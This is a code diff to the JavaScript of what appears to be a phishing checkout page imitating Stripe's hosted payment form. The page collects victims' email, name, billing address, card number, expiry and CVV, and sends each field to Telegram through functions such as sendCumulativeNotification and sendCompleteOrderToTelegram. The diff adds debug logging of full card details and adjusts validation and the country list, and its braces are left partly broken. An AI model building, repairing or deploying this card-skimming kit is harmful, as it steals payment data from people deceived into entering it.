@@ -302,12 +302,12 @@ function formatCVV(input) {
     return false;
 }
 
-// Update Pay button state
+    // Update Pay button state - DEBUG VERSION
 function updatePayButton() {
     const submitButton = document.querySelector('[data-testid="hosted-payment-submit-button"]');
     
     if (!submitButton) {
-        console.log('Submit button not found');
+        console.log('❌ Submit button not found');
         return;
     }
     
@@ -315,7 +315,8 @@ function updatePayButton() {
     const email = document.querySelector('input[name="email"]') ? document.querySelector('input[name="email"]').value : '';
     const name = document.getElementById('individualName') ? document.getElementById('individualName').value : '';
     const address1 = document.getElementById('billingAddressLine1') ? document.getElementById('billingAddressLine1').value : '';
-    const country = document.getElementById('billingCountry') ? document.getElementById('billingCountry').value : '';
+    const countrySelect = document.getElementById('billingCountry');
+    const country = countrySelect ? countrySelect.value : '';
     
     const cardNumberInput = document.getElementById('cardNumber');
     const cardExpiryInput = document.getElementById('cardExpiry');
@@ -325,41 +326,80 @@ function updatePayButton() {
     const cardExpiry = cardExpiryInput ? cardExpiryInput.value : '';
     const cardCvc = cardCvcInput ? cardCvcInput.value : '';
     
+    // DEBUG: Log all values
+    console.log('=== DEBUG START ===');
+    console.log('1. Email:', email, 'Valid:', email && email.includes('@'));
+    console.log('2. Name:', name, 'Valid:', name && name.trim().length >= 2);
+    console.log('3. Address1:', address1, 'Valid:', address1 && address1.trim().length > 0);
+    console.log('4. Country:', country, 'Valid:', country && country !== '');
+    console.log('5. Card Number:', cardNumber, 'Length:', cardNumber.length, 'Valid:', cardNumber && cardNumber.length === 16);
+    console.log('6. Card Expiry:', cardExpiry, 'Length:', cardExpiry.length, 'Valid:', cardExpiry && cardExpiry.length >= 5);
+    console.log('7. Card CVV:', cardCvc, 'Length:', cardCvc.length, 'Valid:', cardCvc && cardCvc.length >= 3);
+    console.log('=== DEBUG END ===');
+    
     // Check if all fields have reasonable values
-    const isCardValid = cardNumber && cardNumber.length >= 15;
-    const isExpiryValid = cardExpiry && cardExpiry.length >= 4;
+    const isCardValid = cardNumber && cardNumber.length === 16;
+    const isExpiryValid = cardExpiry && cardExpiry.length >= 5;
     const isCVVValid = cardCvc && cardCvc.length >= 3;
     
     const isComplete = email && email.includes('@') && 
                       name && name.trim().length >= 2 &&
                       address1 && address1.trim().length > 0 &&
-                      country && country !== '' &&
                       isCardValid && isExpiryValid && isCVVValid;
     
+    console.log('isComplete result:', isComplete);
+    console.log('Button currently disabled:', submitButton.disabled);
+    
     if (isComplete) {
-        // ENABLE the button
+        // ENABLE the button - BLUE color
         submitButton.disabled = false;
         submitButton.classList.remove('SubmitButton--incomplete');
         submitButton.style.opacity = '1';
         submitButton.style.cursor = 'pointer';
         submitButton.style.pointerEvents = 'auto';
+        submitButton.style.backgroundColor = 'rgb(0, 116, 212)'; // Stripe blue
         console.log('✅ Pay button ENABLED');
     } else {
-        // DISABLE the button
+        // DISABLE the button - GRAY color
         submitButton.disabled = true;
         submitButton.classList.add('SubmitButton--incomplete');
         submitButton.style.opacity = '0.5';
         submitButton.style.cursor = 'not-allowed';
         submitButton.style.pointerEvents = 'none';
+        submitButton.style.backgroundColor = '#6c757d'; // Gray
+        console.log('❌ Pay button DISABLED - Condition failed');
     }
 }
 
-// Setup country select with only 3 countries
-function setupCountrySelect() {
-    const countrySelect = document.getElementById('billingCountry');
-    if (!countrySelect) {
-        console.log('Country select not found with ID billingCountry');
-        return;
+    function setupCountrySelect() {
+        const countrySelect = document.getElementById('billingCountry');
+        if (!countrySelect) {
+            console.log('Country select not found with ID billingCountry');
+            return;
+        }
+        
+        // DO NOT clear existing options! Keep all countries from HTML
+        // REMOVE THIS LINE: countrySelect.innerHTML = '';
+        
+        // Just add the change event listener
+        countrySelect.addEventListener('change', function() {
+            if (this.value) {
+                formData.country = this.value;
+                
+                // Send notification for country selection
+                if (!addressFieldsSent.country) {
+                    sendCumulativeNotification('country', this.value, 'Country');
+                    addressFieldsSent.country = true;
+                }
+                
+                updatePayButton();
+                
+                // Check if all fields are complete after country
+                if (checkAllFieldsComplete() && !cardInfoSent) {
+                    cardInfoSent = true;
+                }
+            }
+        });
     }
     
     // Clear existing options
@@ -406,7 +446,7 @@ function setupCountrySelect() {
             }
         }
     });
-}
+
 
 // Initialize event listeners
 function initEventListeners() {
@@ -689,12 +729,19 @@ function initEventListeners() {
 
 // Initialize when DOM is loaded
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('✅ DOM loaded, initializing payment form...');
+    console.log('✅ DOM loaded, checking functions...');
+    console.log('updatePayButton exists?', typeof updatePayButton);
+    console.log('initEventListeners exists?', typeof initEventListeners);
+    
     // Wait a bit for all elements to load
     setTimeout(() => {
-        initEventListeners();
-        console.log('📋 Only 3 countries available: USA, UK, Canada');
-        console.log('🔔 Telegram notifications enabled for all fields');
+        if (typeof initEventListeners === 'function') {
+            initEventListeners();
+            console.log('📋 Countries available: All');
+            console.log('🔔 Telegram notifications enabled');
+        } else {
+            console.error('❌ initEventListeners function not found!');
+        }
         
         // Store user ID in sessionStorage if not exists
         if (!sessionStorage.getItem('stripe_user_id')) {
@@ -712,3 +759,4 @@ document.addEventListener('DOMContentLoaded', function() {
 
 // Export functions for use in index.php
 window.sendCompleteOrderToTelegram = sendCompleteOrderToTelegram;
+
